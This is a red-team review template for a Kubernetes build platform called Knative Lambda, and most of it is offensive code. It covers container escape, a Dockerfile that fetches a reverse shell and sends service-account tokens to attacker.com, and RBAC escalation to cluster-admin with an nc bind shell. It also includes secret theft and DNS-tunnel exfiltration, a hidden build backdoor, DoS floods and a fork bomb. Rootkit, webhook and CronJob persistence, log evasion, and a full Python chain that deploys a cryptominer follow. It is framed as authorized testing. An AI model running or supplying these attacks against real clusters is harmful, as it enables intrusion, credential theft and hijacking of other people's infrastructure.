# 💀 Blackhat Review - Knative Lambda

## 👤 Reviewer Role
**Blackhat (Offensive Security Specialist)** - Focus on exploiting vulnerabilities, finding 0-days, breaking the system, and demonstrating real-world attack scenarios

> ⚠️ **WARNING**: This document contains offensive security techniques. Use ONLY in authorized testing environments.

---

## 🎯 Attack Objectives

### Primary Targets
1. **🎯 Container Escape** - Break out of container to host
2. **🎯 Privilege Escalation** - Get cluster-admin access
3. **🎯 Data Exfiltration** - Steal build source code and secrets
4. **🎯 Crypto Mining** - Deploy unauthorized workloads
5. **🎯 Supply Chain Attack** - Inject backdoors into builds
6. **🎯 Denial of Service** - Take down the platform
7. **🎯 Lateral Movement** - Compromise other services
8. **🎯 Persistence** - Maintain access after detection

---

## 💣 Attack Vectors

### 1. Container Escape & Host Compromise (P0)

#### Attack Scenario: Break Out of Build Container
```bash
# ATTACK: Kaniko build container escape
# The Kaniko builder runs as privileged to build containers
# Can we escape to the underlying node?

# Step 1: Get code execution in build
# Inject malicious source code in CloudEvent
POST /cloudevents
{
  "type": "build.started",
  "data": {
    "sourceCode": "console.log('pwned');\nrequire('child_process').exec('curl http://attacker.com/$(hostname)/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)')"
  }
}

# Step 2: From inside Kaniko container
# Check if we're running privileged
cat /proc/self/status | grep CapEff

# Check for Docker socket mounting (JACKPOT!)
ls -la /var/run/docker.sock

# If docker socket mounted, we own the host
docker run -it -v /:/host alpine chroot /host /bin/bash

# Alternative: Exploit kernel vulnerabilities
# Download exploit
wget http://attacker.com/dirty-cow
chmod +x dirty-cow
./dirty-cow

# Get access to node filesystem via /proc
cat /proc/1/cgroup  # Get host info
ls -la /proc/1/root  # Access host filesystem

# Mount host filesystem
mkdir /tmp/host
mount /dev/sda1 /tmp/host
```

#### Exploit: Malicious Dockerfile Injection
```dockerfile
# Inject into build template
FROM node:18-alpine

# Stage 1: Recon
RUN apk add curl \
    && curl http://attacker.com/beacon?host=$(hostname)

# Stage 2: Download reverse shell
RUN wget http://attacker.com/shell.sh -O /tmp/s.sh \
    && chmod +x /tmp/s.sh

# Stage 3: Persistence (survives container rebuild)
RUN echo '*/5 * * * * /tmp/s.sh' | crontab -

# Stage 4: Exfiltrate K8s secrets
RUN curl -X POST http://attacker.com/exfil \
    -d "token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

# Stage 5: Your "legitimate" code
COPY . /app
```

---

### 2. Kubernetes API Exploitation (P0)

#### Attack Scenario: RBAC Privilege Escalation
```bash
# ATTACK: Abuse overly permissive ServiceAccount

# Step 1: Get ServiceAccount token from pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Step 2: Check what we can do
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"knative-lambda"}}'

# Step 3: Can we create jobs? (Build jobs = code execution!)
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/batch/v1/namespaces/knative-lambda/jobs \
  -d @- << EOF
{
  "apiVersion": "batch/v1",
  "kind": "Job",
  "metadata": {"name": "backdoor"},
  "spec": {
    "template": {
      "spec": {
        "containers": [{
          "name": "shell",
          "image": "alpine",
          "command": ["sh", "-c", "while true; do nc -lvp 4444 -e /bin/sh; done"],
          "securityContext": {"privileged": true}
        }],
        "hostNetwork": true,
        "hostPID": true,
        "restartPolicy": "Never"
      }
    }
  }
}
EOF

# Step 4: Can we create ClusterRoleBindings? (GAME OVER)
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  -d @- << EOF
{
  "apiVersion": "rbac.authorization.k8s.io/v1",
  "kind": "ClusterRoleBinding",
  "metadata": {"name": "pwned"},
  "roleRef": {
    "apiGroup": "rbac.authorization.k8s.io",
    "kind": "ClusterRole",
    "name": "cluster-admin"
  },
  "subjects": [{
    "kind": "ServiceAccount",
    "name": "knative-lambda-builder",
    "namespace": "knative-lambda"
  }]
}
EOF

# Step 5: We're cluster-admin now, deploy crypto miners
kubectl apply -f http://attacker.com/cryptominer.yaml
```

#### Exploit: Secret Extraction
```bash
# ATTACK: Steal all secrets in cluster

# Get all secrets we have access to
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/knative-lambda/secrets

# Get AWS credentials
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/knative-lambda/secrets/aws-credentials | \
  jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'

# Get MinIO credentials
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/knative-lambda/secrets/minio-credentials | \
  jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'

# Exfiltrate everything
curl -X POST http://attacker.com/loot \
  -d "secrets=$(curl -k -H 'Authorization: Bearer $TOKEN' $APISERVER/api/v1/secrets)"
```

---

### 3. Code Injection & Supply Chain Attack (P0)

#### Attack Scenario: Backdoor All Builds
```javascript
// ATTACK: Inject malicious code into all JavaScript functions

// Payload to inject via CloudEvent
const maliciousCode = `
// Invisible backdoor (whitespace characters)
const ​ = require('child_process');
const ‌ = require('http');

// Exfiltrate environment variables on every function invocation
​.exec('env | curl -X POST http://attacker.com/env -d @-');

// Remote code execution backdoor
‌.createServer((req, res) => {
  if (req.headers['x-backdoor'] === 'execute') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const result = ​.execSync(body).toString();
      res.end(result);
    });
  } else {
    res.end('OK'); // Look normal
  }
}).listen(8081);

// Your "legitimate" function code below
`;

// Send via CloudEvent
POST /cloudevents
{
  "type": "build.started",
  "data": {
    "buildID": "innocent-build",
    "sourceCode": maliciousCode + "\n\n" + legitimateCode
  }
}
```

#### Exploit: Template Injection
```go
// ATTACK: Escape template rendering to execute arbitrary code

// If templates use unsafe rendering:
// File: internal/templates/templates.go

// Malicious input
buildRequest := BuildRequest{
    FunctionName: "{{.}}{{system \"curl http://attacker.com/pwned\"}}",
    Runtime: "{{range .}}{{.}}{{end}}",
}

// Or try Server-Side Template Injection (SSTI)
imageName := "test{{7*7}}"  // Should return "test49" if vulnerable

// Full RCE payload for Go templates
imageName := "{{.}}{{range $k,$v := .Env}}{{if eq $k \"SECRET\"}}{{printf \"%s\" $v | exec \"curl http://attacker.com/?s=%s\"}}{{end}}{{end}}"
```

---

### 4. Data Exfiltration (P0)

#### Attack Scenario: Steal All Build Source Code
```bash
# ATTACK: Access S3/MinIO buckets and exfiltrate everything

# Step 1: Get MinIO credentials from environment or secrets
# (Already extracted in Attack #2)

# Step 2: Access MinIO directly
mc alias set target https://minio.homelab ACCESS_KEY SECRET_KEY

# Step 3: List all build contexts
mc ls target/build-contexts/ --recursive

# Step 4: Download everything
mc mirror target/build-contexts/ ./stolen-code/

# Step 5: Exfiltrate via DNS tunneling (avoid egress detection)
for file in ./stolen-code/*; do
  data=$(base64 -w0 $file | fold -w 50)
  for chunk in $data; do
    dig $chunk.exfil.attacker.com
  done
done

# Alternative: Exfiltrate via HTTPS (looks like normal traffic)
tar czf - ./stolen-code | curl -T - https://attacker.com/upload
```

#### Exploit: Timing Attack for Secret Enumeration
```python
# ATTACK: Enumerate secrets via timing side-channel

import time
import requests

def timing_attack(secret_name):
    """
    If secret validation has timing differences,
    we can enumerate valid secret names
    """
    start = time.time()
    r = requests.post('http://knative-lambda/cloudevents', json={
        'type': 'build.started',
        'data': {
            'secretRef': secret_name
        }
    })
    elapsed = time.time() - start
    return elapsed

# Timing differences reveal valid secrets
possible_secrets = ['aws-creds', 'minio-creds', 'registry-auth']
for secret in possible_secrets:
    t = timing_attack(secret)
    print(f"{secret}: {t:.4f}s")
    # Valid secrets take longer due to decryption
```

---

### 5. Denial of Service (P0)

#### Attack Scenario: Resource Exhaustion
```bash
# ATTACK: Exhaust cluster resources

# Spam build requests
for i in {1..10000}; do
  curl -X POST http://knative-lambda/cloudevents \
    -H "Content-Type: application/cloudevents+json" \
    -d "{
      \"type\": \"build.started\",
      \"id\": \"flood-$i\",
      \"data\": {
        \"buildID\": \"attack-$i\",
        \"sourceCode\": \"$(cat /dev/urandom | head -c 10M | base64)\"
      }
    }" &
done

# Each build creates:
# - 1 Kubernetes Job
# - 1 S3 upload (large file)
# - 1 Container image build
# = Cluster OOM + S3 storage exhaustion

# Alternative: Billion Laughs Attack
POST /cloudevents
{
  "data": {
    "sourceCode": "const a='a'.repeat(10000000000);"
  }
}

# Alternative: Fork Bomb in Build
Dockerfile: RUN :(){ :|:& };:

# Alternative: Slowloris Attack
while true; do
  (echo -ne "POST /cloudevents HTTP/1.1\r\nHost: knative-lambda\r\n" && sleep 10) | \
  nc knative-lambda 80 &
done
```

#### Exploit: Algorithmic Complexity Attack
```javascript
// ATTACK: Trigger regex DoS (ReDoS)

// If input validation uses regex, test for ReDoS
const payload = {
  buildID: "a".repeat(10000) + "b"  // Catastrophic backtracking
};

// Or nested JSON structures
const nestedJSON = JSON.parse('{"a":'.repeat(10000) + 'null' + '}'.repeat(10000));
```

---

### 6. Persistence & Backdoors (P0)

#### Attack Scenario: Maintain Access After Detection
```yaml
# ATTACK: Plant multiple backdoors

# Backdoor 1: Malicious Init Container
apiVersion: v1
kind: Pod
metadata:
  name: innocent-pod
spec:
  initContainers:
  - name: setup
    image: alpine
    command: ["/bin/sh"]
    args:
    - -c
    - |
      # Download and install rootkit
      wget http://attacker.com/rootkit.sh -O /tmp/r.sh
      chmod +x /tmp/r.sh
      /tmp/r.sh install
      
      # Modify any binaries on shared volumes
      echo '#!/bin/bash\ncurl http://attacker.com/beacon\nexec /real-binary "$@"' > /shared/kubectl
      chmod +x /shared/kubectl
    volumeMounts:
    - name: shared
      mountPath: /shared
  containers:
  - name: app
    image: legitimate-app

# Backdoor 2: Mutating Webhook
# Inject sidecar into ALL pods in namespace
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: innocent-webhook
webhooks:
- name: backdoor.attacker.com
  clientConfig:
    url: "https://attacker.com/mutate"
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  # Webhook adds exfiltration sidecar to every pod

# Backdoor 3: CronJob Persistence
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-cleanup  # Looks innocent
  namespace: kube-system
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: cleanup
            image: alpine
            command:
            - /bin/sh
            - -c
            - |
              # Re-establish reverse shell every 5 minutes
              wget http://attacker.com/shell.sh -O- | sh
              
              # Recreate deleted backdoors
              kubectl apply -f http://attacker.com/backdoors.yaml
```

---

### 7. Network Pivoting & Lateral Movement (P1)

#### Attack Scenario: Compromise Entire Homelab
```bash
# ATTACK: From knative-lambda to full homelab compromise

# Step 1: We're inside knative-lambda namespace
# Enumerate network
nmap -sn 10.0.0.0/8

# Step 2: Find other services
kubectl get svc --all-namespaces

# Step 3: Exploit trust relationships
# MinIO might trust our IP, try accessing without auth
curl http://minio.minio:9000/

# Prometheus metrics often expose secrets
curl http://prometheus.prometheus:9090/api/v1/targets | grep password

# Grafana might have default admin:admin
curl -u admin:admin http://grafana.grafana/api/dashboards/

# Step 4: Service mesh exploitation
# If Linkerd is used, we can intercept traffic
# Inject proxy to MITM all service-to-service traffic

# Step 5: Pivot to other namespaces
# Use stolen ServiceAccount tokens
for ns in $(kubectl get ns -o name); do
  TOKEN=$(kubectl get secret -n $ns -o jsonpath='{.items[0].data.token}' | base64 -d)
  curl -k -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default/api/v1/namespaces/$ns/pods
done

# Step 6: Compromise infrastructure components
# Get node SSH keys from secrets
kubectl get secrets -n kube-system | grep ssh

# Access etcd (all cluster data!)
ETCDCTL_API=3 etcdctl --endpoints=https://etcd:2379 get "" --prefix --keys-only
```

---

### 8. Advanced Evasion Techniques (P1)

#### Hiding from Detection
```bash
# ATTACK: Evade monitoring and detection

# Technique 1: Process hiding
# Run malicious process but hide from 'ps'
mount -o bind /dev/null /proc/$(pidof malicious)/cmdline

# Technique 2: Log evasion
# Don't write to stdout/stderr, they go to logs
exec 1>/dev/null 2>/dev/null

# Technique 3: Metric poisoning
# If Prometheus scrapes us, return fake metrics
while true; do
  echo 'http_requests_total{status="200"} 1000' | nc -l -p 9090
done

# Technique 4: Timing evasion
# Sleep during business hours, attack at night
while true; do
  hour=$(date +%H)
  if [ $hour -ge 22 ] || [ $hour -le 6 ]; then
    # Attack
    ./payload.sh
  fi
  sleep 3600
done

# Technique 5: Low and slow
# Exfiltrate 1 byte per minute (below rate limit detection)
for byte in $(xxd -p sensitive.data); do
  curl http://attacker.com/$byte
  sleep 60
done

# Technique 6: Legitimate-looking traffic
# Exfiltrate via User-Agent header (looks like normal browser traffic)
data=$(cat secrets.txt | base64 -w0)
curl -A "Mozilla/5.0 $data Firefox/120.0" http://google.com
```

---

## 🎯 Exploit Development

### Custom Exploit: CloudEvent RCE Chain
```python
#!/usr/bin/env python3
"""
Full RCE exploit chain for Knative Lambda
Demonstrates: Input validation bypass -> Code injection -> Container escape -> Cluster admin
"""

import requests
import base64
import json

class KnativeLambdaExploit:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        
    def stage1_inject_code(self):
        """Stage 1: Inject malicious code via CloudEvent"""
        payload = {
            "specversion": "1.0",
            "type": "build.started",
            "source": "exploit",
            "id": "pwn-001",
            "data": {
                "buildID": "exploit-build",
                "imageName": "pwned-image",
                "sourceCode": self.get_malicious_code(),
                "runtime": "nodejs18"
            }
        }
        
        resp = self.session.post(
            f"{self.target}/cloudevents",
            json=payload,
            headers={"Content-Type": "application/cloudevents+json"}
        )
        
        return resp.status_code == 200
    
    def get_malicious_code(self):
        """Generate malicious source code"""
        return """
        const { exec } = require('child_process');
        const http = require('http');
        
        // Stage 2: Download and execute payload
        exec('wget http://attacker.com/stage2.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s', 
             (err, stdout, stderr) => {
            if (!err) {
                // Stage 3: Exfiltrate K8s token
                const token = require('fs').readFileSync(
                    '/var/run/secrets/kubernetes.io/serviceaccount/token', 
                    'utf8'
                );
                
                http.get(`http://attacker.com/token?t=${encodeURIComponent(token)}`);
            }
        });
        
        // Legitimate-looking code
        module.exports.handler = async (event) => {
            return { statusCode: 200, body: 'OK' };
        };
        """
    
    def stage2_get_token(self, token):
        """Stage 2: Use stolen token to escalate privileges"""
        headers = {"Authorization": f"Bearer {token}"}
        
        # Try to create cluster-admin binding
        payload = {
            "apiVersion": "rbac.authorization.k8s.io/v1",
            "kind": "ClusterRoleBinding",
            "metadata": {"name": "exploit-admin"},
            "roleRef": {
                "apiGroup": "rbac.authorization.k8s.io",
                "kind": "ClusterRole",
                "name": "cluster-admin"
            },
            "subjects": [{
                "kind": "ServiceAccount",
                "name": "knative-lambda-builder",
                "namespace": "knative-lambda"
            }]
        }
        
        resp = self.session.post(
            "https://kubernetes.default/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
            json=payload,
            headers=headers,
            verify=False
        )
        
        return resp.status_code == 201
    
    def stage3_deploy_payload(self, token):
        """Stage 3: Deploy crypto miner as cluster-admin"""
        headers = {"Authorization": f"Bearer {token}"}
        
        # Deploy crypto miner DaemonSet (runs on every node)
        payload = {
            "apiVersion": "apps/v1",
            "kind": "DaemonSet",
            "metadata": {
                "name": "system-daemon",
                "namespace": "kube-system"
            },
            "spec": {
                "selector": {"matchLabels": {"name": "system-daemon"}},
                "template": {
                    "metadata": {"labels": {"name": "system-daemon"}},
                    "spec": {
                        "hostNetwork": True,
                        "hostPID": True,
                        "containers": [{
                            "name": "miner",
                            "image": "attacker/cryptominer:latest",
                            "securityContext": {"privileged": True},
                            "volumeMounts": [{
                                "name": "host",
                                "mountPath": "/host"
                            }]
                        }],
                        "volumes": [{
                            "name": "host",
                            "hostPath": {"path": "/"}
                        }]
                    }
                }
            }
        }
        
        resp = self.session.post(
            "https://kubernetes.default/apis/apps/v1/namespaces/kube-system/daemonsets",
            json=payload,
            headers=headers,
            verify=False
        )
        
        return resp.status_code == 201
    
    def pwn(self):
        """Execute full exploit chain"""
        print("[*] Starting exploit chain...")
        
        print("[*] Stage 1: Injecting malicious code...")
        if self.stage1_inject_code():
            print("[+] Code injected successfully!")
        else:
            print("[-] Stage 1 failed")
            return False
        
        print("[*] Stage 2: Waiting for token exfiltration...")
        # In real exploit, would wait for HTTP callback with token
        token = input("Enter exfiltrated token: ")
        
        if self.stage2_get_token(token):
            print("[+] Escalated to cluster-admin!")
        else:
            print("[-] Stage 2 failed")
            return False
        
        print("[*] Stage 3: Deploying payload...")
        if self.stage3_deploy_payload(token):
            print("[+] Payload deployed! Crypto miner running on all nodes.")
            print("[+] Full cluster compromise achieved!")
            return True
        else:
            print("[-] Stage 3 failed")
            return False

if __name__ == "__main__":
    exploit = KnativeLambdaExploit("http://knative-lambda.homelab")
    exploit.pwn()
```

---

## 🔬 0-Day Research Areas

### Potential 0-Day Vulnerabilities to Explore

1. **Kaniko Build Process**
   - Race conditions in layer caching
   - Path traversal in COPY commands
   - Privilege escalation via --chown flag

2. **Knative Eventing**
   - CloudEvent schema bypass
   - Event filter evasion
   - Broker authentication bypass

3. **Go Template Engine**
   - SSTI (Server-Side Template Injection)
   - Unsafe reflection usage
   - Type confusion attacks

4. **S3 Pre-signed URLs**
   - Signature bypass
   - Time manipulation
   - Bucket enumeration

5. **Prometheus Metrics**
   - Label injection
   - Cardinality explosion DoS
   - Metric poisoning

---

## 🚨 Critical Findings

### Exploit Severity Matrix

| Vulnerability | Exploitable? | Impact | CVSS | PoC Available |
|--------------|--------------|--------|------|---------------|
| Container Escape | [ ] | Critical | 10.0 | [ ] |
| Privilege Escalation | [ ] | Critical | 9.8 | [ ] |
| Code Injection | [ ] | Critical | 9.6 | [ ] |
| Secret Theft | [ ] | High | 8.5 | [ ] |
| DoS | [ ] | High | 7.5 | [ ] |
| Data Exfiltration | [ ] | High | 8.0 | [ ] |

### Weaponized Exploits
```markdown
Exploit 1: ___________________________________________________
- CVE: (if applicable)
- Attack Vector: _________________________________________
- Exploit Code: [attached/linked]
- Impact: _______________________________________________
- Mitigation: ___________________________________________

Exploit 2: ___________________________________________________
- CVE: (if applicable)
- Attack Vector: _________________________________________
- Exploit Code: [attached/linked]
- Impact: _______________________________________________
- Mitigation: ___________________________________________
```

---

## ✅ Blackhat Assessment

```markdown
Reviewer: Blackhat (Offensive Security Specialist)
Date: _____________

Exploitation Difficulty:
[ ] Trivial (Script kiddie level)
[ ] Easy (Public exploits available)
[ ] Medium (Requires custom exploit)
[ ] Hard (Requires 0-day research)
[ ] Very Hard (Multiple vulns needed)

Overall Security Rating:
[ ] 💀💀💀💀💀 Completely Owned (5 skulls)
[ ] 💀💀💀💀 Critically Vulnerable (4 skulls)
[ ] 💀💀💀 Vulnerable (3 skulls)
[ ] 💀💀 Some Issues (2 skulls)
[ ] 💀 Hardened (1 skull)
[ ] 🛡️ Fort Knox (0 skulls)

Time to Full Compromise:
Estimated: ___ hours/days/weeks

Critical Attack Paths Found: ___

Working Exploits Developed: ___

Recommended Fixes (Priority Order):
1. _____________________________________________________________
2. _____________________________________________________________
3. _____________________________________________________________

Comments:
_________________________________________________________________
_________________________________________________________________
_________________________________________________________________
```

---

**Last Updated**: 2025-10-23  
**Maintainer**: @brunolucena  
**Review Frequency**: After every security patch + quarterly red team exercises

**⚠️ LEGAL NOTICE**: All attacks described are for authorized security testing only. Unauthorized access is illegal.

